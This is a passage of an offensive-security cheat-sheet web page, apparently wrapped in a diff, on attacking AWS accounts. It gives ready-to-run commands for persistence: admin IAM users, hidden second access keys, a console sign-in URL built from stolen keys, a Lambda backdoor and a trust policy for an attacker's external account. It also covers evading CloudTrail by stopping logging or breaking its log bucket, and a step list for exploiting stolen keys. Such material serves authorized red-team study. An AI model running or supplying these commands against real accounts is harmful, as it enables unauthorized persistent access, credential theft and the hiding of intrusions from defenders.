+</span></span><span class="line"><span class="cl"><span class="c1">## Then dig through tar layers for embedded secrets</span>
+</span></span></code></pre></div><h3 id="eks-kubernetes" data-heading-permalink="true"><span class="heading-content">EKS (Kubernetes)</span>
+    <a class="heading-permalink" href="#eks-kubernetes" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Get kubeconfig for a cluster:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws eks update-kubeconfig --name cluster-name --region us-east-1
+</span></span><span class="line"><span class="cl">kubectl get pods -A
+</span></span><span class="line"><span class="cl">kubectl get secrets -A
+</span></span></code></pre></div><ul>
+<li>Once in the cluster, see <a href="https://jinpwn.dev/cheatsheets/cloud/gcp/">GCP</a>
+ / standard K8s attacks for pod -&gt; node -&gt; cluster escalation</li>
+</ul>
+<h2 id="viii-persistence-in-aws" data-heading-permalink="true"><span class="heading-content">viii. Persistence in AWS</span>
+    <a class="heading-permalink" href="#viii-persistence-in-aws" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="new-iam-user-with-admin" data-heading-permalink="true"><span class="heading-content">New IAM user with admin</span>
+    <a class="heading-permalink" href="#new-iam-user-with-admin" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam create-user --user-name svc-backup
+</span></span><span class="line"><span class="cl">aws iam create-access-key --user-name svc-backup
+</span></span><span class="line"><span class="cl">aws iam attach-user-policy --user-name svc-backup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+</span></span></code></pre></div><h3 id="second-access-key-on-legitimate-user-subtle" data-heading-permalink="true"><span class="heading-content">Second access key on legitimate user (subtle)</span>
+    <a class="heading-permalink" href="#second-access-key-on-legitimate-user-subtle" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Most accounts allow 2 keys per user. Add a second one to an existing admin:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam create-access-key --user-name existing_admin
+</span></span><span class="line"><span class="cl"><span class="c1">## Save these somewhere - they survive the user&#39;s password rotation</span>
+</span></span></code></pre></div><h3 id="console-access-via-federation" data-heading-permalink="true"><span class="heading-content">Console access via federation</span>
+    <a class="heading-permalink" href="#console-access-via-federation" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Get a console URL valid for 12 hours, even without console password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">SESSION_JSON</span><span class="o">=</span><span class="k">$(</span>curl --get <span class="s2">&#34;https://signin.aws.amazon.com/federation&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --data-urlencode <span class="s2">&#34;Action=getSigninToken&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --data-urlencode <span class="s2">&#34;Session={\&#34;sessionId\&#34;:\&#34;</span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">\&#34;,\&#34;sessionKey\&#34;:\&#34;</span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">\&#34;,\&#34;sessionToken\&#34;:\&#34;</span><span class="nv">$AWS_SESSION_TOKEN</span><span class="s2">\&#34;}&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">SIGNIN_TOKEN</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$SESSION_JSON</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r .SigninToken<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;https://signin.aws.amazon.com/federation?Action=login&amp;Issuer=&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&amp;SigninToken=</span><span class="nv">$SIGNIN_TOKEN</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><h3 id="lambda-backdoor" data-heading-permalink="true"><span class="heading-content">Lambda backdoor</span>
+    <a class="heading-permalink" href="#lambda-backdoor" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Create a Lambda with a generous role, trigger it via a public endpoint or scheduled event:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws lambda create-function ...      <span class="c1">## with role=AdminRole</span>
+</span></span><span class="line"><span class="cl">aws apigateway create-rest-api ...  <span class="c1">## expose Lambda via HTTPS</span>
+</span></span></code></pre></div><h3 id="custom-trust-policy-on-a-high-priv-role" data-heading-permalink="true"><span class="heading-content">Custom trust policy on a high-priv role</span>
+    <a class="heading-permalink" href="#custom-trust-policy-on-a-high-priv-role" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Add a trust to your external attacker account:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam update-assume-role-policy --role-name AdminRole <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --policy-document <span class="s1">&#39;{&#34;Version&#34;:&#34;2012-10-17&#34;,&#34;Statement&#34;:[{&#34;Effect&#34;:&#34;Allow&#34;,&#34;Principal&#34;:{&#34;AWS&#34;:&#34;arn:aws:iam::YOUR_ATTACKER_ACCT:root&#34;},&#34;Action&#34;:&#34;sts:AssumeRole&#34;}]}&#39;</span>
+</span></span></code></pre></div><h2 id="ix-cloudtrail-and-detection" data-heading-permalink="true"><span class="heading-content">ix. CloudTrail and detection</span>
+    <a class="heading-permalink" href="#ix-cloudtrail-and-detection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>CloudTrail logs almost every API call. Common evasion:</p>
+<ul>
+<li><strong>Disable CloudTrail</strong> if you have rights (loud, immediately suspicious):
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws cloudtrail stop-logging --name &lt;trail&gt;
+</span></span></code></pre></div></li>
+<li><strong>Region hopping</strong>: trails are sometimes single-region. Operate in regions with no trail.</li>
+<li><strong>S3 bucket destination tampering</strong>: trail still tries to log but logs go nowhere. Edit the trail&rsquo;s destination bucket policy to deny PutObject.</li>
+<li><strong>Read-only actions in many services log to &ldquo;Data Events&rdquo;</strong> which are off by default for S3, Lambda, etc. Read-heavy enumeration is often unlogged.</li>
+</ul>
+<p>Check trail status:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws cloudtrail describe-trails
+</span></span><span class="line"><span class="cl">aws cloudtrail get-trail-status --name &lt;trail&gt;
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Most operations are logged</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Anything that mutates state, creates resources, or assumes roles is in CloudTrail by default. Defender response on a real engagement is fast once they see anomalous IAM activity. Operate quickly, mind your IP.</p>
+  </div>
+</div>
+<h2 id="x-decision-tree" data-heading-permalink="true"><span class="heading-content">x. Decision tree</span>
+    <a class="heading-permalink" href="#x-decision-tree" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Got AWS keys, now what?</p>
+<ol>
+<li><code>aws sts get-caller-identity</code> → confirm what kind of identity</li>
+<li><code>pacu</code> import + <code>iam__enum_permissions</code> → know your effective rights</li>
+<li><code>iam__privesc_scan</code> → automated check for known paths</li>
+<li>If no IAM privesc → service-specific (Lambda env vars, EC2 IMDS, RDS snapshots, Secrets Manager dump)</li>
+<li>If cross-account roles exist → enumerate trust policies, see if you can assume</li>
+<li>If persistence needed → second access key on existing user, or new user with admin</li>
+</ol>
+<p>Always pair AWS findings with BloodHound-style graphing for AWS (aws_pwn, Cartography, PMapper):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pmapper graph create --account-id ACCT
+</span></span><span class="line"><span class="cl">pmapper visualize --account-id ACCT --filetype svg
+</span></span></code></pre></div>
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/cloud/cloud-storage/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Cloud Storage</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/cloud/azure/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Azure</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
